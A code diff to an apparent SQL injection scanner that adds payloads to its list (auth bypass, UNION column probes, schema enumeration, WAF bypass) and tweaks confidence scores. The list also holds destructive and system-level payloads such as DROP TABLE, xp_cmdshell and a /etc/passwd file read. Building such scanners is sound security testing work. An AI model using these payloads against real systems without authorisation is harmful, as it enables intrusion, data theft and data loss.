@@ -83,6 +83,9 @@ const SQL_PAYLOADS: SQLPayload[] = [
   { payload: `\"`, type: 'Error-based', severity: 'high', confidence: 0.95 },
   { payload: `')`, type: 'Error-based (Parenthesis)', severity: 'high', confidence: 0.9 },
   { payload: `"))`, type: 'Error-based (Double Parenthesis)', severity: 'high', confidence: 0.9 },
+  { payload: `\`)`, type: 'Error-based (Backtick)', severity: 'high', confidence: 0.9 },
+  { payload: `\'))`, type: 'Error-based (Double Single Quote)', severity: 'high', confidence: 0.9 },
+  { payload: `\"))`, type: 'Error-based (Double Double Quote)', severity: 'high', confidence: 0.9 },
 
   // --- Boolean-based (Critical for Auth Bypass) ---
   { payload: `' OR '1'='1`, type: 'Boolean-based', severity: 'critical', confidence: 0.98 },
@@ -90,14 +93,19 @@ const SQL_PAYLOADS: SQLPayload[] = [
   { payload: `admin' --`, type: 'Comment-based', severity: 'high', confidence: 0.9 },
   { payload: `admin' #`, type: 'Comment-based (MySQL)', severity: 'high', confidence: 0.9 },
   { payload: `' OR 2>1--`, type: 'Boolean-based', severity: 'critical', confidence: 0.98 },
+  { payload: `' AND 1=1--`, type: 'Boolean-based', severity: 'medium', confidence: 0.8 },
+  { payload: `' AND 1=0--`, type: 'Boolean-based', severity: 'medium', confidence: 0.8 },
+  { payload: `) OR 1=1--`, type: 'Boolean-based (Parenthesis)', severity: 'critical', confidence: 0.95 },
+  { payload: `)) OR 1=1--`, type: 'Boolean-based (Double Parenthesis)', severity: 'critical', confidence: 0.95 },
 
   // --- Union-based (Data Exfiltration) ---
   { payload: `' UNION SELECT NULL--`, type: 'Union-based', severity: 'critical', confidence: 0.9 },
   { payload: `' UNION SELECT 1,2,3--`, type: 'Union-based', severity: 'critical', confidence: 0.9 },
   { payload: `-1' UNION SELECT @@version, user(), database()--`, type: 'Union-based (Info Leak)', severity: 'critical', confidence: 0.98 },
+  { payload: `-1' UNION SELECT 1,null,3,4,5,6,7,8,9,10--`, type: 'Union-based (Column Count)', severity: 'high', confidence: 0.85 },
+  { payload: `-1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--`, type: 'Union-based (Column Count)', severity: 'high', confidence: 0.85 },
 
   // --- Time-based Blind (Critical for Data Exfiltration) ---
-  // Use a 5-second delay for high confidence detection
   { payload: `' AND SLEEP(5)--`, type: 'Time-based Blind (MySQL)', severity: 'critical', confidence: 1.0 }, 
   { payload: `1' WAITFOR DELAY '0:0:5'--`, type: 'Time-based Blind (SQL Server)', severity: 'critical', confidence: 1.0 }, 
   { payload: `1; SELECT PG_SLEEP(5)--`, type: 'Time-based Blind (PostgreSQL)', severity: 'critical', confidence: 1.0 }, 
@@ -107,11 +115,15 @@ const SQL_PAYLOADS: SQLPayload[] = [
   { payload: `1; EXEC xp_cmdshell('whoami')--`, type: 'Stacked Query (SQL Server)', severity: 'catastrophic', confidence: 1.0 },
   { payload: `1; DROP TABLE users--`, type: 'Stacked Query (Data Loss)', severity: 'catastrophic', confidence: 1.0 },
   { payload: `1' AND (SELECT LOAD_FILE('/etc/passwd'))--`, type: 'File Read (MySQL)', severity: 'critical', confidence: 0.95 },
+  { payload: `1' AND (SELECT 'a' FROM sys.sysobjects WHERE xtype='U')--`, type: 'Schema Enumeration (MSSQL)', severity: 'high', confidence: 0.9 },
+  { payload: `1' AND (SELECT COUNT(*) FROM information_schema.tables)--`, type: 'Schema Enumeration (MySQL)', severity: 'high', confidence: 0.9 },
 
   // --- WAF Bypass / Obfuscation Attempts ---
   { payload: `' OR /*!500001=1*/--`, type: 'WAF Bypass (MySQL Inline Comment)', severity: 'high', confidence: 0.85 },
   { payload: `' OR '1'='1' /**/`, type: 'WAF Bypass (Multi-line Comment)', severity: 'high', confidence: 0.85 },
   { payload: `1' AND '1'='1' AND 'a'='a`, type: 'WAF Bypass (Keyword Split)', severity: 'medium', confidence: 0.75 },
+  { payload: `1' OR 1=1-- -`, type: 'WAF Bypass (Trailing Dash)', severity: 'high', confidence: 0.85 },
+  { payload: `1' OR 1=1;--`, type: 'WAF Bypass (Semicolon)', severity: 'high', confidence: 0.85 },
 ];
 
 
@@ -278,7 +290,7 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
                 type,
                 evidence: `Server returned ${response.status} (baseline: ${baselineStatus})`,
                 parameter: paramKey,
-                confidence: 0.8, // Increased confidence to 0.8
+                confidence: 0.85, // Increased confidence to 0.85
               });
             }
           }
@@ -300,7 +312,7 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
                   type,
                   evidence: `Response size: ${text.length} bytes (baseline: ${baselineLength}, diff: ${percentDiff.toFixed(1)}%)`,
                   parameter: paramKey,
-                  confidence: 0.7, // Increased confidence to 0.7
+                  confidence: 0.75, // Increased confidence to 0.75
                 });
               }
             }
